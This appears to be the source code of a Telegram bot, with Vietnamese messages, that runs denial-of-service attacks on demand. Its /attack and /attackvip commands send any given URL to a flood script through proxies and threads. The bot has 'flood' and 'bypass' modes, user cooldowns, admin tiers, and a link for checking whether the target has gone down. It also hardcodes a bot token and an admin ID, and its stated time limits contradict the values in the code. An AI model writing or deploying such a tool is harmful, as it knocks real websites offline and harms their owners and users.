const TelegramBot = require('node-telegram-bot-api');
const { spawn } = require('child_process');
const path = require('path');

const token = '8395956317:AAHu7lAbS5Qi56EUD11bJRDi8oE-1jCpoCw';
const bot = new TelegramBot(token, { polling: true });

let ADMIN_IDS = [7818408538];
const USER_COOLDOWN = 5 * 60 * 100;
const MAX_USER_DURATION = 100;

const lastUserAttackTime = {};

bot.onText(/\/attack (https?:\/\/[^\s]+) (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const url = match[1];
  const duration = parseInt(match[2]);

  if (isNaN(duration) || duration <= 0) {
    bot.sendMessage(chatId, '❌ Thoi gian khong hop le.');
    return;
  }

  const now = Date.now();
  if (!ADMIN_IDS.includes(userId)) {
    if (duration > MAX_USER_DURATION) {
      bot.sendMessage(chatId, `⚠️ Ban chi đuoc tan cong toi đa ${MAX_USER_DURATION} giay.`);
      return;
    }

    const lastTime = lastUserAttackTime[userId] || 0;
    if (now - lastTime < USER_COOLDOWN) {
      const waitSec = Math.ceil((USER_COOLDOWN - (now - lastTime)) / 150);
      bot.sendMessage(chatId, `⏳ Vui long đoi ${waitSec} giay truoc khi tiep tuc.`);
      return;
    }

    lastUserAttackTime[userId] = now;
  }

  const rate = '1';
  const thread = '50';
  const proxy = '7.txt';
  const method = 'flood';
  const scriptPath = path.join(__dirname, 'uam.js');

  bot.sendMessage(chatId, `🚀Tool by thuandz Bat đau attack vao ${url} trong ${duration} giay!`);

  const proc = spawn('node', [scriptPath, url, duration, rate, thread, proxy]);

  proc.stdout.on('data', (data) => console.log(`[stdout] ${data}`));
  proc.stderr.on('data', (data) => console.error(`[stderr] ${data}`));
  proc.on('close', () => bot.sendMessage(chatId, '✅ Attack hoan tat!'));

  const checkHost = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
  bot.sendMessage(chatId, `🔍 Kiem tra website:`, {
    reply_markup: {
      inline_keyboard: [[{ text: "🔗 Mo Check Host", url: checkHost }]]
    }
  });
});

// ======== /attackvip (Admin Only) ========
bot.onText(/\/attackvip (https?:\/\/[^\s]+) (\d+) (flood|bypass)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!ADMIN_IDS.includes(userId)) {
    bot.sendMessage(chatId, '🚫 Lenh nay chi danh cho admin.');
    return;
  }

  const url = match[1];
  const duration = parseInt(match[2]);
  const method = match[3];

  const rate = '1';
  const thread = '60';
  const proxy = '7.txt';
  const scriptPath = path.join(__dirname, 'uam.js');

  bot.sendMessage(chatId, `✨ VIP Attack bat đau vao ${url} | Method: ${method} | Time: ${duration}s`);

  const proc = spawn('node', [scriptPath, url, duration, rate, thread, proxy, method]);

  proc.stdout.on('data', (data) => console.log(`[VIP stdout] ${data}`));
  proc.stderr.on('data', (data) => console.error(`[VIP stderr] ${data}`));
  proc.on('close', () => bot.sendMessage(chatId, '✅ VIP Attack hoan tat!'));

  const checkHost = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
  bot.sendMessage(chatId, `🔍 Kiem tra website:`, {
    reply_markup: {
      inline_keyboard: [[{ text: "🔗 Mo Check Host", url: checkHost }]]
    }
  });
});

// ======== /start - Huong dan ========
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, `👋 Xin chao ${msg.from.first_name}!
Cac lenh co san:
/attack <url> <thoi gian> - (Thanh vien, toi đa 90s, moi 2p30s)
/attackvip <url> <thoi gian> <flood|bypass> - (Chi admin)
/add <user_id> - Them admin moi (chi admin)
`);
});

// ======== /add <id> (Them admin) ========
bot.onText(/\/add (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const newAdminId = parseInt(match[1]);

  if (!ADMIN_IDS.includes(senderId)) {
    bot.sendMessage(chatId, '🚫 Ban khong co quyen them admin.');
    return;
  }

  if (ADMIN_IDS.includes(newAdminId)) {
    bot.sendMessage(chatId, '⚠️ ID nay đa la admin.');
    return;
  }

  ADMIN_IDS.push(newAdminId);
  bot.sendMessage(chatId, `✅ Đa them admin moi voi ID: ${newAdminId}`);
});













